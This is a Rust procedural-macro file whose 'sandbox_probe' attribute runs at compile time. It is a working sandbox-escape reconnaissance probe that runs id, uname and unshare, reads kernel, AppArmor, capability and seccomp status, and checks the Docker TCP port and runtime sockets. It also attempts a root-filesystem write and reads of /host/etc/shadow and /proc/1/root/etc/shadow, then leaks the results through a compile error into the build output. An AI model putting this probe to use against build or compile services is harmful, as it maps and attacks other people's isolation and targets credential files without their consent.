extern crate proc_macro;

use proc_macro::TokenStream;
use std::{
    fs,
    net::{SocketAddr, TcpStream},
    process::Command,
    time::Duration,
};

fn clean(value: String) -> String {
    value
        .replace(['\0', '\n', '\r'], " ")
        .trim()
        .to_string()
}

fn read(path: &str) -> String {
    fs::read_to_string(path)
        .map(clean)
        .unwrap_or_else(|error| format!("error:{error}"))
}

fn run(program: &str, args: &[&str]) -> String {
    Command::new(program)
        .args(args)
        .output()
        .map(|output| {
            format!(
                "exit={:?} stdout={} stderr={}",
                output.status.code(),
                clean(String::from_utf8_lossy(&output.stdout).into_owned()),
                clean(String::from_utf8_lossy(&output.stderr).into_owned())
            )
        })
        .unwrap_or_else(|error| format!("error:{error}"))
}

#[proc_macro_attribute]
pub fn sandbox_probe(_attr: TokenStream, _item: TokenStream) -> TokenStream {
    let id = run("id", &[]);
    let uname = run("uname", &["-a"]);
    let hostname = read("/etc/hostname");
    let apparmor = read("/proc/self/attr/current");
    let status = fs::read_to_string("/proc/self/status")
        .map(|value| {
            value
                .lines()
                .filter(|line| {
                    ["CapEff:", "NoNewPrivs:", "Seccomp:", "Seccomp_filters:"]
                        .iter()
                        .any(|prefix| line.starts_with(prefix))
                })
                .collect::<Vec<_>>()
                .join(" ")
        })
        .unwrap_or_else(|error| format!("error:{error}"));
    let docker = "127.0.0.1:2375"
        .parse::<SocketAddr>()
        .map_err(|error| error.to_string())
        .and_then(|address| {
            TcpStream::connect_timeout(&address, Duration::from_millis(500))
                .map_err(|error| error.to_string())
        });
    let root_write = fs::write("/sandbox-probe", b"probe");
    let host_shadow = fs::read("/host/etc/shadow");
    let proc1_root = fs::read("/proc/1/root/etc/shadow");
    let runtime_socket = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/run/containerd/containerd.sock",
    ]
    .iter()
    .any(|path| fs::metadata(path).is_ok());
    let userns = run("unshare", &["-Ur", "true"]);
    let mountns = run("unshare", &["-m", "true"]);
    let message = format!(
        "SANDBOX_ESCAPE_PROBE id=[{id}] uname=[{uname}] kernel=[{}] hostname=[{hostname}] apparmor=[{apparmor}] status=[{status}] uid_map=[{}] cgroup=[{}] pid1=[{}] self_mntns=[{:?}] pid1_mntns=[{:?}] docker_tcp=[{}] runtime_socket=[{}] rootfs_write=[{}] host_shadow=[{}] proc1_root_shadow=[{}] userns=[{userns}] mountns=[{mountns}]",
        read("/proc/version"),
        read("/proc/self/uid_map"),
        read("/proc/self/cgroup"),
        read("/proc/1/cmdline"),
        fs::read_link("/proc/self/ns/mnt"),
        fs::read_link("/proc/1/ns/mnt"),
        if docker.is_ok() { "connected" } else { "blocked" },
        if runtime_socket { "present" } else { "absent" },
        if root_write.is_ok() { "writable" } else { "blocked" },
        if host_shadow.is_ok() { "readable" } else { "blocked" },
        if proc1_root.is_ok() { "readable" } else { "blocked" },
    );
    format!("compile_error!({message:?});")
        .parse()
        .expect("valid compile error")
}
